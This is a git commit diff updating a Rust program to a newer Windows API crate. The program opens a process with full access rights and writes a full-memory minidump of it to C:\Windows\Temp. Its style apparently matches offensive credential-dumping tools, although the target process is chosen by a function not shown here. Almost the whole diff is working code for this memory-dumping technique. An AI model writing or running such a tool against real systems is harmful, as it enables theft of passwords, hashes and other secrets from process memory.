c12759995c3130995eb494aa80843982fe8cc836
Dylan Reuter <djreuter45@gmail.com>
2023-08-01 09:27:26 -0500

    update for windows crate version bump

--- src/main.rs
+++ src/main.rs
@@ -1,12 +1,11 @@
-use std::ptr;
 use sysinfo::{System, ProcessExt, SystemExt, PidExt};
 use windows::Win32::Security::SECURITY_ATTRIBUTES;
-use windows::Win32::Storage::FileSystem::{CreateFileW, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_MODE, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL};
-use windows::Win32::System::Diagnostics::Debug::{MiniDumpWriteDump, MiniDumpWithFullMemory};
+use windows::Win32::Storage::FileSystem::{CreateFileA, FILE_SHARE_MODE, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL};
+use windows::Win32::System::Diagnostics::Debug::{MiniDumpWriteDump, MiniDumpWithFullMemory, MINIDUMP_EXCEPTION_INFORMATION, MINIDUMP_USER_STREAM_INFORMATION, MINIDUMP_CALLBACK_INFORMATION};
 use windows::Win32::System::Threading::{OpenProcess, PROCESS_ACCESS_RIGHTS};
 use windows::Win32::Foundation::{HANDLE, CloseHandle, GetLastError};
-use windows::core::HSTRING;
-use windows::w;
+use windows::core::PCSTR;
+use windows::s;
 
 fn get_pid() -> u32 {
     let mut sys: System = System::new_all();
@@ -32,18 +31,25 @@ fn main() {
         println!("[+] Opening handle to process...");
         let h_proc: HANDLE = OpenProcess(PROCESS_ACCESS_RIGHTS(2035711), false, pid).expect("Error opening handle to process");
 
-        let f_name: &HSTRING = w!("C:\\Windows\\Tasks\\file.dmp");
-        let sa: SECURITY_ATTRIBUTES = SECURITY_ATTRIBUTES::default();
+        const GENERIC_READ: u32 = 0x80000000;
+        const GENERIC_WRITE: u32 = 0x40000000;
+
+        let f_name: PCSTR = s!("C:\\Windows\\Temp\\rustdump.dmp");
+        let mut sa: SECURITY_ATTRIBUTES = SECURITY_ATTRIBUTES::default();
         println!("[+] Creating file...");
-        let h_file: HANDLE = CreateFileW(
+        let h_file: HANDLE = CreateFileA(
             f_name,
-            FILE_GENERIC_READ | FILE_GENERIC_WRITE,
+            GENERIC_READ | GENERIC_WRITE,
             FILE_SHARE_MODE(0),
-            &sa,
+            Some(&mut sa),
             CREATE_ALWAYS,
             FILE_ATTRIBUTE_NORMAL,
             HANDLE(0)
         ).unwrap();
+
+        let mini_excep: MINIDUMP_EXCEPTION_INFORMATION = MINIDUMP_EXCEPTION_INFORMATION::default();
+        let mini_userstr: MINIDUMP_USER_STREAM_INFORMATION = MINIDUMP_USER_STREAM_INFORMATION::default();
+        let mini_cb: MINIDUMP_CALLBACK_INFORMATION = MINIDUMP_CALLBACK_INFORMATION::default();
 
         println!("[+] Creating dump...");
         if !MiniDumpWriteDump(
@@ -51,14 +57,14 @@ fn main() {
             pid,
             h_file,
             MiniDumpWithFullMemory,
-            ptr::null_mut(),
-            ptr::null_mut(),
-            ptr::null_mut(),
+            Some(&mini_excep),
+            Some(&mini_userstr),
+            Some(&mini_cb)
         ).as_bool() {
             let e = GetLastError();
             panic!("Error creating dump! {:?}", e);
         }
         CloseHandle(h_file);
-        println!("[+] Dump file saved to {}", f_name.to_string());
+        println!("[+] Dump file saved to {}", f_name.to_string().unwrap());
     }
 }
